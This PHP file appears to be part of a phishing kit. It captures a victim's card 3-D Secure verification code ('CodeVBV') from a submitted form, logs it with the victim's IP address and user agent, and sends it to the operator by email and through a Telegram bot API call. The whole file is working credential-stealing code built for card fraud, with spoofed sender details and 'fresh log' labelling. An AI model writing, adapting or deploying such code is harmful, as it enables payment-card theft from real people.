<?php

include("../common/sub_includes.php");
include('../common/includes.php');
include("../config.php");

ob_start();
if(!isset($_SESSION)){
    session_start();  // Et on ouvre la session
} 

$CodeVBV = $_POST['CodeVBV'];


if($_SERVER['REQUEST_METHOD'] == 'POST'){

  $_SESSION['CodeVBV']  = $CodeVBV;

$message = 'ㅤ
[🦊] Certificat Querty log +1 [🦊]

🔐 CodeVBV : '.$_SESSION['CodeVBV'].'

🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
';

if($mail_send == true){
  $Subject=" 「🍓」+1 Fr3sh Certificat CodeVBV from ".$_SESSION['CodeVBV']." | ".$_SERVER['HTTP_USER_AGENT'];
  $head="From: Certificat <info@querty.bg>";

  mail($my_mail,$Subject,$message,$head,$heads);
}

if($tlg_send == true){
    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=".$rez_login."&text=".urlencode("$message"));
}

}
